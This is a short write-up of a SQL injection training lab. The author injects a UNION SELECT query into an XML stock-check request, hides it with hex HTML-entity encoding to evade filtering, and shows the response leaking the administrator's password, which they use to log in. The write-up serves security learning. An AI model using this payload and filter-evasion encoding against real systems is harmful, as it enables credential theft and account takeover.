*This lab contains a SQL injection vulnerability in its stock check feature. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. The database contains a users table, which contains the usernames and passwords of registered users. To solve the lab, perform a SQL injection attack to retrieve the admin user's credentials, then log in to their account.*

Upon loading the page, I clicked on the first product's details, clicked on *Check stock* and observed the request in HTTP History: 
![[Screenshot 2024-05-03 at 12.40.28 PM.png]]

From the request sent, we see that the `productID` and `storeid` is encoded in XML. I can obfuscate my attack by encoding the the following injected query: 
```Burp 
UNION SELECT password FROM users WHERE username-'administrator'
```
 to : 
```Burp 
&#x31;&#x20;&#x55;&#x4e;&#x49;&#x4f;&#x4e;&#x20;&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;&#x20;&#x70;&#x61;&#x73;&#x73;&#x77;&#x6f;&#x72;&#x64;&#x20;&#x46;&#x52;&#x4f;&#x4d;&#x20;&#x75;&#x73;&#x65;&#x72;&#x73;&#x20;&#x77;&#x68;&#x65;&#x72;&#x65;&#x20;&#x75;&#x73;&#x65;&#x72;&#x6e;&#x61;&#x6d;&#x65;&#x3d;&#x27;&#x61;&#x64;&#x6d;&#x69;&#x6e;&#x69;&#x73;&#x74;&#x72;&#x61;&#x74;&#x6f;&#x72;&#x27;
```
Using the following encoding: 
![[Screenshot 2024-05-03 at 1.08.35 PM.png]]
Received the following response: 
```Burp 
HTTP/2 200 OK
Content-Type: text/plain; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 30

983 units
wtwk4h33msbs83et8u1z
```

Using the password above, I logged in as administrator!
![[Screenshot 2024-05-03 at 1.09.59 PM.png]]